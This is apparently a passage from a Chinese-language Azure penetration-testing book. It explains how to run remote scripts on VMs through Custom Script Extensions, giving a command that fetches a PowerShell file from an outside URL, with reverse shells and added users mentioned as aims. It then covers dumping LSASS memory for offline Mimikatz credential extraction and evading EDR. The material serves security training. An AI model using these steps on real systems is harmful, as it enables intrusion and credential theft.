    ## 执行 VM 扩展


    作为本节的最后一点，我们想介绍使用 VM 扩展在 VM 上运行命令。虽然这不是运行命令的最简单方式，但在某些情况下，它可能是你唯一的选择。


    Azure VM 扩展是管理员在 VM 部署后用于配置 VM 的工具。为了针对不同用途定制这些扩展，Microsoft 允许基于其定义的架构创建自定义脚本扩展。


    该架构包含指向脚本文件的文件 URI 或 URL，使我们可以指定要执行的 PowerShell 文件。作为攻击者，我们将需要一个 Web 服务器来托管这些文件
    URI。我们建议使用 Azure Blob Storage 内置的 Web 托管功能，或使用 Azure App Service 来托管这些文件。


    运行自定义脚本扩展的命令由以下参数组成：


    - **ResourceGroupName**：VM 的资源组。

    - **VMName**：VM 的名称。

    - **Location**：VM 所在的区域。

    - **FileUri**：脚本文件的 HTTP/HTTPS URL。

    - **Run**：要运行的文件；应与 ps1 文件名相同。

    - **Name**：自定义脚本扩展将使用的名称。


    ```

    PS C:\> Set-AzVMCustomScriptExtension -ResourceGroupName TEST -VMName PentestVM
    -Location westcentralus -FileUri ''http://book.azurepentesting.com/whoami.ps1''
    -Run ''whoami.ps1'' -Name CustomScriptExtension

    ```


    在前面的命令示例中，我们将在 PentestVM 主机上运行 whoami.ps1 脚本（托管在 book.azurepentesting.com 上）。在更实际的场景中，我们会使用自定义脚本扩展来创建反向
    shell 或向 VM 添加新用户。


    > **重要说明**

    > 本章恰好介绍了本书技术审阅者之一 Jake Karnes 的两项研究成果。我们强烈建议你阅读他关于使用 Azure VM 扩展在 Azure VM 上启动
    Covenant C2 植入体的深入文章：https://blog.netspi.com/attacking-azure-with-custom-script-extensions/。


    虽然这是另一种盲命令执行方法，但它可以很方便地在 VM 上获得初步立足点。这种方法也为我们作为订阅参与者可使用的 Azure 功能这部分内容画上了句号。接下来，我们将回顾使用刚刚介绍的方法要从
    VM 中收集的数据。


    ## 从 Azure VM 中提取数据


    现在，我们已经充分了解了作为参与者操作 Azure VM 的众多选项。凭借此访问权限，我们将开始从这些 VM 中收集敏感信息和凭据，以提升租户中的权限，并可能提升
    AD 域中的权限。


    以下是我们希望从 VM 中收集的一些常见信息类型：


    - Windows NTLM 哈希和内存中的凭据

    - 存储在 VM 扩展设置中的凭据

    - 敏感文件和本地管理员密码哈希


    我们已经介绍了如何查找托管标识并从其中收集令牌，但它们也是从 VM 中提取凭据数据的关键目标。


    ## 使用 Mimikatz 收集本地凭据


    虽然 Mimikatz 的所有功能足以写成一本书，但我们只会介绍从 Windows VM 中提取凭据所需的基础知识。运行 Mimikatz 的最基本方式是在受害机器上运行可执行文件。虽然这种方法可行，但任何还算最新的端点检测与响应（EDR）软件都会在可执行文件写入虚拟磁盘后立即捕获它。


    如果面对的是不太成熟的 EDR，我们可以尝试使用 Invoke-Mimikatz PowerShell 脚本在内存中运行它，或者使用其他技术将 Mimikatz
    直接加载到内存中。对于某些较弱的 EDR 配置，这可能可行，但我们也发现这种方式被检测到的情况也越来越多。


    最后，我们可以尝试转储 LSASS 进程内存，并使用 Mimikatz 离线解析。这样我们永远不必将 Mimikatz 放置在 VM 上，而且也不太可能触发任何警报。许多防御工具现在都在监视
    LSASS 进程并保护内存空间不被转储，因此你的实际效果可能会有所不同。


    从好的方面来说，遇到几乎没有或完全没有端点保护的开发 VM 并不罕见。这些 VM 可能是绝佳的凭据来源，也可能完全是空的开发机器。无论如何，我们将通过以下步骤介绍最终技术，作为离线运行
    Mimikatz 解析 LSASS 转储的示例：


    - 1. 在目标 VM 上，打开任务管理器（按 Ctrl + Shift + Esc 或在“开始”菜单中键入 taskmgr）。

    - 2. 在“**详细信息**”选项卡下，找到 lsass.exe 进程。

    - 3. 右键单击 lsass 进程，然后选择“**创建转储文件**”：


    ![](img/4fa338e84e0a590967a142dd798ba4e2_215_0.png)


    图 5.26 – 创建 LSASS 转储文件


    - 4. 转储文件写入完成后，Windows 将告知生成的 .dmp 文件的路径。

    - 5. 导航到该文件夹，将 .dmp 文件从 VM 复制到你的测试系统。

    - 6. 在你的测试系统上，打开一个具有特权的 PowerShell 或 CMD 会话，并从 GitHub 下载 Mimikatz：https://github.com/gentilkiwi/mimikatz。

    - 7. 运行 Mimikatz 可执行文件，并使用 sekurlsa::minidump lsass.dmp 命令将 .dmp 文件加载到 Mimikatz。

